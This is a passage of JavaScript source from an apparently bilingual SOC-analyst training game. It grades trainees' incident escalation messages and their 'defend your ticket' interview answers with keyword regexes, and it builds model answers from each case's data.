    hora: /\b([01]?\d|2[0-3]):[0-5]\d\b/,
    accion: /\b(deshabilit|aisl|bloque|revoc|cort|elimin|purg|restablec|cambi|escal|investig|revis|contien|conten|disabl|isolat|block|revok|kill|remov|purg|reset|chang|escalat|investigat|review|contain)\w*/,
    urgencia: /\b(critica|critico|alta|alto|media|medio|baja|bajo|urgente|prioridad|critical|high|medium|low|urgent|priority|p[1-4])\b/,
    jerga: /\b(eventid|logontype|targetusername|subjectusername|sha256|hash|ioc|ttp|mitre|t\d{4}(?:\.\d{3})?|lsass|ntlm|kerberos|payload|powershell|cmd\.exe|udp|tcp|smb|rdp|dns|edr|siem|waf)\b|\b(?:\d{1,3}\.){3}\d{1,3}\b/,
    impacto: /\b(client|dato|servicio|factur|pedido|nomina|operaci|reputaci|multa|ley|rgpd|dinero|pago|transferencia|venta|negocio|empleado|customer|data|service|invoice|order|payroll|operation|reputation|fine|law|gdpr|money|payment|transfer|sale|business|employee)\w*/,
    situacion: /\b(contenid|controlad|bloquead|aislad|investig|equipo de seguridad|soc|contained|under control|blocked|isolated|investigat|security team)\w*/,
    peticion: /\b(necesit|pedimos|decid|autoriz|aprob|llam|confirm|recomend|os pido|le pido|need|ask|decide|authori|approv|call|confirm|recommend|please)\w*/
  };
  const palabras = (t) => (String(t ?? '').trim().match(/\S+/g) || []).length;
  function corregirMensaje(tipo, texto, caso) {
    const t = plano(texto);
    const citadas = caso.claves.filter((k) => t.includes(plano(k)));
    // Lo que pasó: dos palabras con contenido del título o de la regla, o el ID de la técnica.
    const VACIAS = new Set(['contra', 'desde', 'hacia', 'entre', 'sobre', 'durante', 'otros', 'otras', 'unos', 'from', 'after', 'about', 'their', 'there', 'other', 'within']);
    const terminos = [...new Set(plano(`${caso.titulo?.es} ${caso.titulo?.en} ${caso.regla?.es} ${caso.regla?.en}`).match(/[a-z0-9]{5,}/g) || [])].filter((w) => !VACIAS.has(w));
    const nTerm = terminos.filter((w) => t.includes(w)).length;
    const que = nTerm >= 2 || (caso.mitre && t.includes(plano(caso.mitre).split('.')[0]));
    const n = palabras(texto);
    const criterios = tipo === 'n2' ? [
      ['que', que],
      ['cuando', RE.hora.test(t)],
      ['quien', citadas.length >= 1],
      ['evidencia', citadas.length >= Math.min(2, caso.claves.length)],
      ['accion', RE.accion.test(t)],
      ['urgencia', RE.urgencia.test(t)]
    ] : [
      ['llano', n > 0 && !RE.jerga.test(t)],
      ['impacto', RE.impacto.test(t)],
      ['situacion', RE.situacion.test(t)],
      ['peticion', RE.peticion.test(t)],
      ['breve', n >= 25 && n <= 120]
    ];
    const lista = criterios.map(([id, ok]) => ({ id, ok: !!ok }));
    return { criterios: lista, completo: lista.every((c) => c.ok), palabras: n, citadas };
  }

  /** Mensaje de ejemplo para un caso escalado: se construye con los datos del caso y cumple su propia corrección. */
  function modeloMensaje(tipo, caso, lang = 'es') {
    const es = lang === 'es';
    const sev = { critica: es ? 'crítica' : 'critical', alta: es ? 'alta' : 'high', media: es ? 'media' : 'medium', baja: es ? 'baja' : 'low' }[caso.sev];
    const L = (o) => (o ? o[lang] ?? o.es : '');
    if (tipo === 'n2') {
      const ev = caso.logs.filter(([, , m]) => caso.claves.some((k) => m.includes(k))).slice(0, 2).map(([t, h, m]) => `${t} ${h} ${m}`);
      const accion = caso.accion === 'contener'
        ? (es ? 'He aplicado la contención del playbook y lo escalo para que revises el alcance.' : 'I have applied the playbook containment and I am escalating it so you can scope it.')
        : (es ? 'No contengo: lo escalo para que decidáis con quien corresponda.' : 'I am not containing it: I am escalating it so you can decide with whoever is responsible.');
      return es
        ? `Prioridad ${sev}. ${L(caso.titulo)} (${L(caso.regla)}), a las ${caso.hora}. Datos clave: ${caso.claves.join(', ')}. Evidencia: ${ev.join(' | ')}. ${accion}`
        : `Priority ${sev}. ${L(caso.titulo)} (${L(caso.regla)}), at ${caso.hora}. Key facts: ${caso.claves.join(', ')}. Evidence: ${ev.join(' | ')}. ${accion}`;
    }
    if (caso.accion === 'contener') return es
      ? `Esta mañana, a las ${caso.hora}, hemos detectado un acceso o un programa no autorizado en un equipo de la empresa. El equipo de seguridad ya lo ha bloqueado y está investigando si ha afectado a datos de clientes o al servicio. Os pediremos que confirméis cualquier corte que afecte a la operación.`
      : `This morning, at ${caso.hora}, we detected unauthorised access or software on a company computer. The security team has already blocked it and is investigating whether customer data or the service were affected. We will ask you to confirm any shutdown that affects operations.`;
    return es
      ? `Esta mañana, a las ${caso.hora}, hemos visto una situación que puede afectar a datos de la empresa o de clientes y que necesita la decisión de un responsable. El equipo de seguridad lo está investigando con discreción. Necesitamos que autoricéis la revisión con Recursos Humanos y Asesoría Jurídica.`
      : `This morning, at ${caso.hora}, we saw a situation that may affect company or customer data and needs a manager's decision. The security team is investigating it discreetly. We need you to authorise the review with HR and Legal.`;
  }

  /* ---------- Defiende tu ticket: la entrevista sobre tus propios casos (0.6.0) ----------
   * Tres preguntas por ticket cerrado, como las de una entrevista técnica de SOC. Si la decisión fue
   * correcta, hay que defenderla frente a la alternativa; si fue un error, reconocerlo y decir qué harías ahora. */
  const PREGUNTAS_DEF = Object.freeze(['veredicto', 'accion', 'evidencia']);
  const XP_DEFENSA = 15; // por ticket con las tres respuestas completas
  const ALTERNATIVA = Object.freeze({ veredicto: { vp: 'fp', fp: 'vp', benigno: 'vp' }, accion: { contener: 'escalar', escalar: 'contener', cerrar: 'escalar' } });
  const NOMBRA = {
    vp: /\b(verdadero positivo|true positive|vp|tp|ataque|attack|malicios\w*)\b/,
    fp: /\b(falso positivo|false positive|fp)\b/,
    benigno: /\b(benign\w*)\b/,
    contener: /\b(conten\w*|contien\w*|contuv\w*|contain\w*)\b/,
    escalar: /\b(escal\w*|n2|tier 2|nivel 2)\b/,
    cerrar: /\b(cerr\w*|cierr\w*|clos\w*)\b/
  };
  const RE_DEF = {
    porque: /\b(porque|ya que|puesto que|dado que|debido a|por eso|por lo que|asi que|because|since|due to|therefore|that is why|so i)\b/,
    riesgo: /\b(riesgo|impacto|dano|propag\w*|negocio|urgen\w*|servicio|usuario\w*|datos|tiempo|minutos?|risk\w*|impact\w*|damage|spread\w*|business|urgent\w*|service|users?|data|time|minutes?)\b/,
    reconoce: /\b(me equivoque|equivoc\w*|error|falle|se me paso|no vi|no mire|confundi|mistake|wrong|missed|overlooked|misread)\b/,
    ahora: /\b(ahora|la proxima|en adelante|a partir de ahora|next time|now i|from now|going forward|in future)\b/
  };
  const DEF_PALABRAS = Object.freeze({ min: 15, max: 150 });
  const horaCorta = (h) => String(h).slice(0, 5);
  /** Primera línea del caso que contiene un dato clave: es la evidencia que se cita en los modelos. */
  const lineaClave = (caso) => caso.logs.find(([, , m]) => caso.claves.some((k) => m.includes(k))) || [caso.hora, caso.fuente, ''];

  /** Las tres preguntas de la entrevista para un ticket cerrado, según lo que se decidió. */
  function preguntasDefensa(caso, resp = {}) {
    return PREGUNTAS_DEF.map((id) => {
      if (id === 'evidencia') return { id, modo: 'defiende' };
      const tu = resp[id] ?? null, sol = caso[id];
      return tu === sol ? { id, modo: 'defiende', tu, alt: ALTERNATIVA[id][tu] } : { id, modo: 'error', tu, sol };
    });
  }

  /** Corrige una respuesta de la entrevista con criterios comprobables en local, como los mensajes. */
  function corregirDefensa(pregunta, texto, caso) {
    const t = plano(texto);
    const n = palabras(texto);
    const citadas = caso.claves.filter((k) => t.includes(plano(k)));
    const breve = n >= DEF_PALABRAS.min && n <= DEF_PALABRAS.max;
    let criterios;
    if (pregunta.modo === 'error') criterios = [['reconoce', RE_DEF.reconoce.test(t)], ['dato', citadas.length >= 1], ['ahora', RE_DEF.ahora.test(t)], ['breve', breve]];
    else if (pregunta.id === 'evidencia') criterios = [['dato', citadas.length >= 1], ['cuando', RE.hora.test(t)], ['porque', RE_DEF.porque.test(t)], ['breve', breve]];
    else criterios = [
      ['porque', RE_DEF.porque.test(t)],
      [pregunta.id === 'veredicto' ? 'dato' : 'riesgo', pregunta.id === 'veredicto' ? citadas.length >= 1 : RE_DEF.riesgo.test(t)],
      ['alternativa', NOMBRA[pregunta.alt].test(t)],
      ['breve', breve]
    ];
    const lista = criterios.map(([id, ok]) => ({ id, ok: !!ok }));
    return { criterios: lista, completo: lista.every((c) => c.ok), palabras: n, citadas };
  }

  const NOMBRES = {
    es: { vp: 'verdadero positivo', fp: 'falso positivo', benigno: 'benigno', contener: 'contener', escalar: 'escalar', cerrar: 'cerrar' },
    en: { vp: 'true positive', fp: 'false positive', benigno: 'benign', contener: 'contain', escalar: 'escalate', cerrar: 'close' }
  };
  /** Respuesta de ejemplo construida con los datos del caso; cumple su propia corrección en los dos idiomas. */
  function modeloDefensa(pregunta, caso, lang = 'es') {
    const es = lang === 'es';
    const N = NOMBRES[es ? 'es' : 'en'];
    const [h, origen] = lineaClave(caso);
    const hora = horaCorta(h);
    const datos = caso.claves.slice(0, 2).join(es ? ' y ' : ' and ');
    if (pregunta.modo === 'error') return es
      ? `Me equivoqué: elegí ${N[pregunta.tu] ?? 'nada'} y lo correcto era ${N[pregunta.sol]}. Se me pasó ${datos} a las ${hora}, que cambia la lectura del caso. Ahora, antes de decidir, compruebo ese dato y lo cito en el ticket.`
      : `I got it wrong: I chose ${N[pregunta.tu] ?? 'nothing'} and the right answer was ${N[pregunta.sol]}. I missed ${datos} at ${hora}, which changes how the case reads. Now I check that fact before deciding and quote it in the ticket.`;
    if (pregunta.id === 'evidencia') return es
